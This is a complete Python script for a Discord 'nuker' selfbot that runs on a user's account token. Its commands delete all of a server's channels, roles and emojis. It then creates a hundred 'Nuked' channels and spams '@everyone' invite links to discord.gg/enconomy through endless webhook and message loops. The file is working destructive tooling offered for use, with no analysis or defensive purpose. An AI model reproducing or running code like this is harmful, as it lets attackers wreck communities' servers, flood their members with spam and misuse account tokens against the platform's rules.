#nuke/selfbot simpless
from pystyle import *
import discord
from discord.ext import commands
from discord import AsyncWebhookAdapter
import aiohttp


tucan = input("token (user) > ")

banner = """ 
 /$$   /$$           /$$                          
| $$$ | $$          | $$                          
| $$$$| $$ /$$   /$$| $$   /$$  /$$$$$$   /$$$$$$ 
| $$ $$ $$| $$  | $$| $$  /$$/ /$$__  $$ /$$__  $$
| $$  $$$$| $$  | $$| $$$$$$/ | $$$$$$$$| $$  \__/
| $$\  $$$| $$  | $$| $$_  $$ | $$_____/| $$      
| $$ \  $$|  $$$$$$/| $$ \  $$|  $$$$$$$| $$      
|__/  \__/ \______/ |__/  \__/ \_______/|__/      
                                                  

made by Freezy#0003
                                                                                                  
"""

banner = Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), Center.XCenter(banner))
print(banner)

intents = discord.Intents(messages=True, guilds=True, members=True)

o = commands.Bot(command_prefix="!", case_insensitive=True, self_bot=True, intents=intents)





@o.event
async def on_ready():
  print(Colorate.Vertical(Colors.cyan_to_blue, Box.DoubleCube(f"""

   Connected : {o.user.name}#{o.user.discriminator}
   ID : {o.user.id}

   Commands:

   !nuke - cocks the server
   !cdel - deletes all the channels
   !emojinuke -  deletes emojis
   !rolenuke - deletes roles
   !flood - flood all chats
  """)))





@o.command()
async def emojinuke(ctx):
    try:
      for emoji in ctx.guild.emojis:
         await emoji.delete()
         print(f"[-] Emoji {emoji.name} deleted.")
    except:
        print("[-] Couldn't delete the emoji.")
        pass



@o.command()
async def nuke(ctx):
    try:
        for channel in ctx.guild.channels:
            await channel.delete()
            print(f"[-] Channel {channel.name} deleted.")
    except:
        print("[-] Couldn't delete the channel.")
        pass
    await ccflood(ctx)


async def ccflood(ctx):
    for i in range(100):
        await ctx.guild.create_text_channel(name="Nuked")  


@o.event
async def on_guild_channel_create(channel):
    try:
      webhook = await channel.create_webhook(name="discord.gg/enconomy")
      async with aiohttp.ClientSession() as session:
        webhook = webhook.from_url(webhook.url, adapter=AsyncWebhookAdapter(session))
        while True:
          await webhook.send("@everyone discord.gg/enconomy")
          print("[-] Webhook sent.")
    except:
        print("[-] Couldn't send the webhook.")
    pass



@o.command()
async def flood(ctx):
    try:
        while True:
            for channel in ctx.guild.channels:
                await channel.send("@everyone discord.gg/enconomy")
                print("[-] Flood sent.")
    except:
        print("[-] Couldn't flood.")
    pass


@o.command()
async def cdel(ctx):
    try:
        for channel in ctx.guild.channels:
            await channel.delete()
            print(f"[-] {channel.name} deleted.")
    except:
        pass

@o.command()
async def rolenuke(ctx):
    try:
      for role in ctx.guild.roles:
          await role.delete()
          print(f"[-] role {role.name} deleted.")
    except:
        print("[-] Couldn't delete role.")
        pass

o.run(tucan, bot=False)

